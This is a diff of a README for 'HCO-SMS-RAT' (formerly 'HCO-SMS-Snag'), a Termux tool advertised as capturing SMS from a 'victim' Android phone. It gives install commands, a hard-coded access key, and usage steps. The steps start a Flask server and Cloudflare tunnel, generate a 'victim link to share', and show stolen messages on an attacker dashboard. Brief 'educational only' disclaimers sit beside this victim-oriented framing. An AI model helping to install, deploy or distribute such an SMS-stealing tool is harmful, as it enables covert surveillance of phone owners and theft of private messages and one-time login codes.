@@ -1,105 +1,115 @@
-<h1 align="center">📩 HCO-SMS-Snag</h1>
+# 💬 HCO-SMS-RAT
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Platform-Termux-black?style=for-the-badge&logo=android" />
-  <img src="https://img.shields.io/badge/Made%20By-Azhar-blue?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Tool%20Type-SMS%20Logger-red?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Status-Fully%20Working-green?style=for-the-badge" />
+  <img src="https://img.shields.io/github/stars/hackerscolonyofficial/HCO-SMS-RAT?style=for-the-badge" />
+  <img src="https://img.shields.io/github/forks/hackerscolonyofficial/HCO-SMS-RAT?style=for-the-badge" />
+  <img src="https://img.shields.io/github/license/hackerscolonyofficial/HCO-SMS-RAT?style=for-the-badge" />
+</p>
+
+<p align="center">
+  <b>Hackers Colony | SMS Sniffer</b><br>
+  Educational tool to capture SMS from an Android device using Termux.
 </p>
 
 ---
 
-## 🚀 About
+## 📲 About HCO-SMS-RAT
 
-**HCO-SMS-Snag** is a Termux-based educational tool that captures SMS messages from a victim's device and displays them live in your terminal. It uses a Flask server and Cloudflare tunneling to create a public link. Victims are asked for permission before data is fetched.
+**HCO-SMS-RAT** is a Termux-based tool that captures incoming SMS from Android phones and displays them on a custom real-time web dashboard.
 
-> 🛑 **Note:** This tool is only for **ethical testing**, education, and awareness.
+> 🔴 **Note:** This tool is for educational and ethical testing **only**. Do not use it on devices you do not own or have permission to test.
 
 ---
 
-## 📲 Termux Setup
+## 🚀 Features
 
-Copy-paste the commands below into your Termux terminal:
+- Real-time SMS capture
+- Custom dashboard with Hackers Colony branding
+- Auto Cloudflare tunnel generation
+- Auto Flask restart on crash
+- YouTube redirect & access key protection
+- Beautifully formatted display of received SMS
+
+---
+
+## 🛠️ Installation & Setup
 
 ```bash
-# ✅ Update Termux
+# Update packages
 pkg update -y && pkg upgrade -y
 
-# ✅ Install Python and Git
-pkg install python -y
-pkg install git -y
+# Install Python & Git
+pkg install python git -y
 
-# ✅ Install Required Python Libraries
-pip install flask requests
+# Clone this repo
+git clone https://github.com/hackerscolonyofficial/HCO-SMS-RAT
+cd HCO-SMS-RAT
 
-# ✅ Clone the Tool
-git clone https://github.com/Hackerscolonyofficial/HCO-SMS-Snag.git
+# Install dependencies
+pip install -r requirements.txt
 
-# ✅ Navigate to the Tool Directory
-cd HCO-SMS-Snag
+# Install Cloudflared
+pkg install cloudflared -y
+```
 
-# ✅ Start the Tool
+---
+
+## ⚙️ Usage
+
+```bash
 python main.py
 ```
 
----
-
-## 📦 Files Included
-
-- `main.py` – Flask server + Cloudflare + SMS Logger
-- `sms.txt` – All collected SMS messages saved here
-- `requirements.txt` – Python dependencies list
-- `.gitignore` – Hides pycache and unnecessary files
-- `README.md` – This full documentation
+- The tool will:
+  - Redirect to YouTube for subscription
+  - Ask for access key (`HCO-KEY-8420611159`)
+  - Start a Flask server on port 5000
+  - Auto-generate a Cloudflare link
+  - Show victim link to share
+  - Display SMS logs on your custom **Hackers Colony dashboard**
 
 ---
 
-## 🛠️ Requirements
+## 🌐 Web Dashboard
 
-All dependencies are listed in `requirements.txt`:
-
-```txt
-flask
-requests
-```
-
-Install them using:
-
-```bash
-pip install -r requirements.txt
-```
+- SMS will appear in a **real-time web panel**
+- Header: `"Hackers Colony - SMS Logs"`
+- Data shown: Timestamp, Sender, Message
+- Clean, dark UI with auto-scroll to newest SMS
 
 ---
 
-## ⚙️ Features
+## 🔒 Disclaimer
 
-- 📩 Logs victim SMS inbox with permission
-- 🔗 Creates public Cloudflare tunnel
-- 🎯 Auto YouTube subscription redirect before tool runs
-- 📥 Saves all SMS to `sms.txt`
-- 🌈 Colorful Termux output (green, red, yellow)
-- 🔐 Secure access key built-in
+> This tool is created solely for **educational and research purposes**.  
+> The developers are **not responsible** for any misuse or damage caused by this tool.
 
 ---
 
-## ⚠️ Disclaimer
+## 👨‍💻 Developed By
 
-> This project is intended for **educational purposes** only.  
-> You are solely responsible for your actions.  
-> **Hackers Colony** and the developer will not be held liable for any misuse.
-
----
-
-## 👨‍💻 Developer
-
-**🔹 Code by Azhar**  
-🎥 [Subscribe on YouTube](https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya)  
-📍 Instagram: [@hackers_colony_official](https://www.instagram.com/hackers_colony_official)  
-📍 Telegram: [Hackers Colony](https://t.me/hackersColony)
+**Azhar**  
+💻 [Hackers Colony Official](https://hackerscolonyofficial.blogspot.com/?m=1)  
+📷 [Instagram](https://www.instagram.com/hackers_colony_official)  
+💬 [Telegram](https://t.me/hackersColony)  
+🌐 [Discord](https://discord.gg/Xpq9nCGD)  
 
 ---
 
-## 💬 Final Quote
+## 🧠 Hackers Quote
 
-> 💡 “**Tools can educate or exploit. Choose wisely.**”  
-> — Hackers Colony
+> _“Hack the planet, but first... learn to protect it.”_
+
+---
+
+## ⚠️ Legal Use Only
+
+Use this tool **only on your own devices** or with **explicit permission**.  
+**Unauthorized access is illegal.**
+
+---
+
+## 📁 License
+
+This project is licensed under the MIT License.  
+Feel free to fork, improve, and contribute responsibly.
